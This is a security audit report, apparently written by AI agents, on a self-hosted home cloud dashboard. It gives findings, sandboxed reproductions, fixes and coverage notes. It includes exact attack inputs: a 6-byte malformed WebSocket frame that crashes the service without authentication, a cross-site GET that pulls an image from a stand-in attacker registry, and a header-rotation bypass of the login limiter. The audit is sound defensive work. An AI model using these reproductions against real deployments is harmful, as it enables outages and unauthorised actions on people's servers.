# Home Cloud: Security Audit Report (run-2, complete)

**Date:** 2026-11-03 · **Source ref:** `36badc7` (branch `t3/deep-project-context`; the only uncommitted changes are documentation) · **Profile:** standard, whole repository, no budget limit · **Run status:** **complete**

**Execution policy:** source review plus bounded local checks.
- **Sandbox:** all target code ran inside a `bwrap` sandbox with no network (isolated loopback only), an empty environment, a read-only target and toolchain, writes allowed only to scratch, plus `prlimit` and a timeout.
- **Inputs:** only dummy secrets were used.
- **Never contacted:** any deployed endpoint, Cloudflare account, Docker daemon, registry or browser.
- **No source file was modified.**

**Prior run:** run-1 (same source) produced 4 confirmed findings and 5 needs-validation leads. All 9 were carried into this run and independently re-verified. Its 11 covered areas got fresh, deeper hunting, and 3 new areas were added. Everything run-1 left undone is done here: a separate record-verification pass for every finding, and a distinct final-clean coverage check.

### Team
| Role | Agents | Model / reasoning |
|---|---|---|
| Lead (ledger, sandbox, evidence promotion, validators, report) | parent | Claude Opus 5.5 |
| Hunters, wave 1 | d1, d2 | DeepSeek V4.1 Flash Free, `max` |
| Hunters, wave 1 | g1, g2 | Gemini 3.8 Flash High |
| Hunter, wave 2 | g3 | Gemini 3.8 Flash High |
| Phase 3 candidate verifiers | gv1–gv5 | Gemini 3.8 Flash High |
| Phase 5 record verifiers (one fresh agent per record) | dv1–dv11 | Gemini 3.8 Flash High |
| Coverage critics: post-wave 1, post-wave 2, final-clean | cr1, cr2, cr3 | Gemini 3.8 Flash High |

24 agents completed work. The DeepSeek free tier hit its usage limit partway through. The first critic and nine Phase 5 launches on DeepSeek failed before doing any work, and were relaunched as fresh Gemini agents. No agent verified a record it had hunted or already checked in Phase 3.

---

## 1. Security posture summary

The core controls are sound:
- Constant-time password comparison, and the agent refuses to start with placeholder secrets.
- A host-only, HttpOnly session cookie.
- Exact Origin/Host checks on every mutation and on both WebSocket endpoints.
- Child processes started with argument arrays only, never a shell.
- Attachment downloads with `nosniff`.
- A pinned `cloudflared` binary and frozen-lockfile installs.

The serious problems sit around those controls rather than inside them:
- **An unauthenticated client can crash the agent with one malformed WebSocket frame** (high).
- **Revoking sessions does not end open terminals.**
- **One GET route has a side effect** (an image pull) that any website can trigger.

Several exposures depend on how the owner has deployed it: SSH published through the tunnel, the LAN auto-switch moving from HTTPS to HTTP, and no anti-framing headers. Keep in mind that an authenticated session is root-equivalent by design (host terminal plus the docker group), so any auth or session weakness has host-level consequences.

## 2. Confirmed findings

| # | Severity | Title | Boundary | Observed result (sandbox) |
|---|---|---|---|---|
| F1 | **High** | One malformed WebSocket frame from an unauthenticated client kills the agent process and its tunnel | Unauthenticated network client → agent availability | A 6-byte RSV1 frame (or an unmasked frame) on any upgrade, including one already rejected as cross-origin, exited stock Node with an unhandled `'error'`. Five crashes in 1.6 s |
| F2 | **Medium** | Open host-terminal WebSocket survives logout, logout-all and password change | Session revocation → host PTY | After revocation the old cookie got 401 and new WebSockets were refused, but the already-open `/terminal` socket still ran commands |
| F3 | **Medium** | Cross-site GET to `/api/docker/images/pull` makes the host Docker daemon pull an attacker-chosen image | Cross-site browser → authenticated Docker action (CSRF) | The GET carried the cookie on a cross-site navigation and returned 200. A fake Docker Engine received `POST /images/create?fromImage=registry.attacker.example/probe`. The POST control request got 403 |
| F4 | Low | Login rate limiter can be bypassed by any loopback client that rotates `CF-Connecting-IP` | Local process or host-network container → login limiter | 100 wrong guesses with rotating headers were never locked out, then the correct password returned 200 |
| F5 | Low | Password rotation rewrites the credential, returns 500 and leaves every existing session valid when the session-epoch file cannot be written | Owner revocation → stolen session | With the config directory unwritable: 500, `.env` holds the new password, and the pre-rotation cookie still returns 200 on `/api/auth/me` |
| F6 | Low | Installer takes the dashboard admin password on the command line, where other local users can read it | Local unprivileged user → admin password | `/proc/<pid>/cmdline` (mode 0444) contained the password for the whole `setup.sh` run |

### F1: Unauthenticated WebSocket frame crashes the agent (High)
- **Source:**
  - `agent/index.js:23` creates the `WebSocketServer` on the shared HTTP server.
  - `index.js:28-51` (the connection router), `agent/sockets/terminal.js:343+` and `agent/sockets/containerExec.js:7+` never attach `ws.on('error')`.
  - There is no `process.on('uncaughtException')`.
  - `ws@8.22.0` emits `'error'` for protocol violations (`ws/lib/websocket.js:1232`), so an unhandled error throws and Node exits.
- **Who can exploit it:** anyone who can reach port 3000 (the agent listens on all interfaces, so any LAN device). No cookie is needed, and a foreign Origin is enough, because `close(1008)` starts a close handshake while the socket keeps reading frames. Reachability through Cloudflare Tunnel is a stated condition, not a proven fact (see §3).
- **Reproduction:** complete a WebSocket upgrade to `/terminal`, then send the 6 bytes `c1 80 01 02 03 04` (RSV1 set, masked, empty payload).
- **Result:** the agent exits. Every dashboard, API and terminal session drops, and the `cloudflared` child (all remote access) goes with it. systemd restarts the agent after 5 s.
- **Persistent outage (inferred):** the unit file sets `StartLimitBurst=5` within `StartLimitIntervalSec=60s` (`home-cloud.service.template:6-7`). Five crashes inside a minute should therefore leave the service failed until an admin intervenes. This is read from the unit file; it was not observed under systemd.
- **Fix:** attach an `'error'` listener to every accepted socket before any close or dispatch, log the error and call `terminate()`. Reject disallowed upgrades earlier, either with `server.on('upgrade')` or with `noServer: true`. Set a small `maxPayload`. Add a regression test that sends a malformed frame and asserts the process is still alive.

### F2: Terminal WebSocket outlives session revocation (Medium)
- **Source:**
  - The epoch is checked only when the socket upgrades: `terminal.js:351-360` and `containerExec.js:15-16`.
  - The message handlers (`terminal.js:380-398`, `containerExec.js:72-83`) never check it again.
  - `incrementSessionEpoch` (`agent/services/preferences.js:185-190`), called from `auth.js:194-212` and `settings.js:343`, never closes sockets.
- **Who can exploit it:** someone holding a stolen or leftover cookie who already has a terminal open.
- **Result:** both logout-all and password change were reproduced. The open socket keeps a root-equivalent shell after revocation.
- **Fix:** record the epoch on each authenticated socket, close stale sockets and their PTY/exec streams whenever the epoch changes, and also re-check the epoch inside the message handlers.

### F3: CSRF via a GET image pull (Medium)
- **Source:**
  - `agent/middleware/origin.js:7,43-55` exempts GET from the Origin check.
  - `agent/routes/docker.js:301-347` calls `docker.pull(req.query.image)`.
  - The cookie is `SameSite=Lax` (`auth.js:7-17`), and browsers send Lax cookies on top-level GET navigations.
- **Impact:**
  - The host `dockerd` contacts the attacker's registry, which reveals the home egress IP that the tunnel is supposed to hide.
  - It downloads layers of whatever size the attacker chooses, which can fill the disk.
  - It is the only GET route with a side effect (all GET routes were checked).
- **Fix:** make the pull a POST and stream progress from the `fetch` response. As defence in depth, reject cookie-authenticated requests that carry `Sec-Fetch-Site: cross-site`.

### F4: Rate-limit bypass via a trusted header from loopback (Low)
- **Source:** `agent/routes/auth.js:61-70`.
- **Who can exploit it:** other local OS users, containers using `network_mode: host`, and other local services. This contradicts SECURITY.md's claim that the same barriers apply on every interface.
- **Why it is only Low:** the default generated password is 32 hex characters.
- **Fix:** also count failures against the real socket peer, with an aggregate cap. Alternatively, honour the header only on a dedicated listener that only cloudflared uses.

### F5: Password change half-applies when the epoch cannot be saved (Low)
- **Source:** `agent/routes/settings.js:340-344`. It rewrites `.env` and `process.env.PASSWORD`, and only then calls `incrementSessionEpoch()`. That call can throw in `preferences.js:158-162`. The catch at `settings.js:351-353` returns 500 without rolling anything back.
- **Who can exploit it:** a stolen-session holder, when the owner's attempt to evict them coincides with a full disk, a read-only home directory, or a `preferences.json` left owned by root. The owner sees a 500 response and believes nothing changed.
- **Fix:** persist the revocation first and refuse the rotation if that fails. Only then rewrite the credential.

### F6: Admin password on the installer's command line (Low)
- **Source:** `setup.sh:81-95`. The README automation example (`README.md:151`) recommends `--password`.
- **Fix:** recommend `HOME_CLOUD_PASSWORD`, the interactive prompt, or a new `--password-file` / `--password-stdin` option. Deprecate `-p/--password`.

Full reproductions are in `FINDINGS-DETAIL.md`.

## 3. Needs validation: leads, not vulnerabilities, with no severity assigned

| Lead | Repository trace | Blocking fact | Bounded local next step | Owner check (no audit traffic) |
|---|---|---|---|---|
| SSH published at `ssh.<domain>` with no Access policy; sshd sees every tunnel client as 127.0.0.1 | `setup.sh:2063-2072, 2102-2109, 1035-1072` | Whether an Access app/policy exists on the Cloudflare account; the effective `sshd` auth settings | Disposable VM running distro-default sshd: run `sshd -T`, check how fail2ban and PerSourcePenalties treat loopback | Zero Trust → Access → Applications: is `ssh.<domain>` covered? Run `sudo sshd -T \| rg -i passwordauthentication` |
| LAN auto-switch redirects HTTPS → `http://<stored IP>` after any 200 from the ping, with no server identity check | `dashboard/src/hooks/useNetworkDetector.ts:60-73,126-166`, `login.tsx:12` | Whether real browsers let an HTTPS page fetch `http://<private-ip>` (mixed content and Local Network Access rules) | Isolated network, impostor server on the stored IP, test in Chrome, Firefox and Safari | At home, does `https://dash.<domain>/login` auto-switch to HTTP? Was a local-network permission ever granted? |
| No `X-Frame-Options` / `frame-ancestors`; same-site sibling apps can frame the authenticated dashboard | `agent/index.js:62-124`, `desktop.tsx:56-60`, `SettingsApp.tsx:841-853` | Whether a lower-trust party can serve HTML on a `<sub>.<domain>` app; headers added at the Cloudflare edge; browser framing behaviour | Local HTTPS proxy serving `dash.test` and `app.test`, then an iframe test | Run `curl -sI https://dash.<domain>/settings` and look for framing headers |
| A public ingress rule outlives a deleted container or compose project | `agent/routes/docker.js:88-119`, `compose.js:380-408`, `ingress.js:312-334` | What Docker reports in `NetworkSettings.Ports` for exited containers; whether anything later rebinds that port | Disposable Docker host: expose, stop, delete, then inspect the config | List ingress hostnames whose port has no running container |
| Updater falls back to a non-frozen `pnpm install` | `agent/services/updateManager.js:443-458` | Whether a release tag can ship an out-of-sync lockfile; how pnpm 12 re-resolves | Local verdaccio registry with dummy package versions | Confirm `--frozen-lockfile` succeeds at every `v*` tag; check logs for "Retrying dependency install" |
| *(also a condition of F1)* Whether Cloudflare's edge or cloudflared forwards malformed WebSocket frames to the origin | `agent/index.js:23` | Proxy behaviour that the source code does not show | n/a | Not resolvable without sending malformed traffic to a deployment; do not probe. Fix F1 regardless; until then treat it as reachable at least from the LAN |

Details are in `NEEDS-VALIDATION.md`.

## 4. Hardening notes (not findings)

**WebSocket server**
- Use `noServer` and reject upgrades in `server.on('upgrade')` before allocating a socket.
- Set a small explicit `maxPayload` (the default is 100 MiB).
- Cap connections per IP.
- Stop preferring `X-Forwarded-Host` / `X-Forwarded-Proto` unless a trusted proxy is configured (`origin.js:14-28`).
- Add a Host allowlist (DNS-rebinding defence).

**Server-sent events (SSE)**
- Container stdout and stats are written raw into `data:` lines (`docker.js:136,194,201`). JSON-encode them, as `compose.js` already does.
- Cap concurrent `/api/metrics` streams.

**Compose project names**
- The list endpoint returns names taken from container labels without validation (`compose.js:157-183`).
- The dashboard interpolates them into URLs without `encodeURIComponent` (`DockerApp.tsx:1527,1544,1565,1928`).
- Apply `isSafeProjectName()` to the list and encode every path segment. Tighten the regex to lowercase letters, digits, `_` and `-`.

**Secrets passed to child processes**
- `docker compose`, git and pnpm inherit `PASSWORD`/`JWT_SECRET`.
- Compose interpolates `${PASSWORD}` from that environment, so a pasted stack file could copy the credential into a container.
- Spawn these with a scrubbed environment, as `terminal.js:28-46` already does.

**Session and revocation**
- `sessionEpoch` falls back to 1 if `preferences.json` is lost (`preferences.js:66-70,92-98`).
- Detached PTYs and their 5 MiB scrollback outlive revocation.
- Use a `__Host-` cookie prefix.
- `updateEnvPassword` can leave a plaintext `.tmp` file behind if the rename fails. Clean it up in a `finally` block.

**Headers**
- Add a default CSP, `Referrer-Policy` and COOP.
- Disable `X-Powered-By`.
- Limit `/api/ping` and `/api/health` to GET/HEAD.
- Sandbox the PDF preview iframe.

**Files and binds**
- Path checks run before the file is opened (TOCTOU; same principal today).
- Reject `:` in bind `hostPath`/`containerPath` (`docker.js:396-402`).

**Ingress**
- `ingress.js:316` protects ports 22 and 3001, but the dashboard runs on port 3000. Protect the configured `PORT` instead.

**Updater**
- Add a downgrade refusal.
- Verify tag signatures.
- On rollback, reinstall the frozen lockfile and rebuild.

**Installer**
- Root-run recovery reads state from the user's `~/.local/state` and `require()`s the user-owned `dotenv`. Keep root-consumed state in a root-owned directory.
- Check ownership before running `rm -rf` on `/tmp/home-cloud-setup.*`.

**CI and docs**
- Pin GitHub Actions to commit SHAs.
- SECURITY.md recommends `git pull && pnpm install`. Use a release tag and a frozen install instead.
- The README pipes `main`'s `setup.sh`, which then installs tag `v1.0.1`.
- Mark the root and agent `package.json` files `"private": true`.

**Known debt (same principal)**
- Compose deploy bypasses the storage-scope jail (`docs/TECHNICAL_DEBT.md` #1).

### Positive patterns observed
- **Authentication and startup:** SHA-256 + `timingSafeEqual` password check; startup refuses placeholder or short secrets.
- **Cookie and Origin:** host-only HttpOnly Lax cookie; exact Origin binding on mutations and WebSockets; JWT and epoch checked on every HTTP request.
- **Processes and files:** `spawn` uses argument arrays everywhere; compose names are regex-checked and contained; only raster images are served inline, everything else is an attachment with `nosniff`.
- **Secrets on disk and in the terminal:** atomic 0600 `.env` writes with a round-trip check; the PTY environment is an allowlist.
- **Supply chain:** `cloudflared` is pinned by SHA-256; frozen lockfile with an `allowBuilds` allowlist; integrity hashes on all 673 packages.
- **CI and tests:** CI runs with `contents: read` and no secrets; test suites use an isolated HOME; no committed secrets in files or git history.
- **Pre-auth limits** (verified locally): a 1 MiB JSON body gets 413, oversized headers get 431, and the login lockout is 5 attempts per 5 minutes per real peer.

## 5. Coverage summary (from `coverage-ledger.json`)

- **24 units:** 13 covered, 11 candidates (every candidate has a final Phase 3 decision and a Phase 5 verification). None blocked, deferred or out of scope.
- **Units by origin:**
  - 9 carried from run-1 and re-verified.
  - 11 run-1 covered units hunted again by fresh agents.
  - 3 new units added at the start: pre-auth resource exhaustion, root-run installer state/TOCTOU, and trust in container-supplied metadata.
  - 1 unit added by critic cr1: authenticated network/metrics/tunnel behaviour.
- **Critics:**
  - cr1 found one gap, which wave 2 covered.
  - cr2 (post-wave 2) came back clean.
  - **cr3, the distinct final-clean critic, came back clean.**
- **Files:** every tracked source, config, script, workflow and test file falls under a reviewed path. Excluded only: images, fonts, CSS, licence, changelog, tsconfig/eslint.
- **Companions excluded with reasons:** AI/LLM (no model surface), memory safety (no native code in the repo), RPC/messaging, multi-tenant isolation.
- **Results:** 6 confirmed, 5 needs validation, 0 rejected.

Machine-readable records are in `findings.json`. Working state (ledger, architecture, every agent's promoted evidence) is at `~/security-audit-skill/home_cloud/run-2/`.
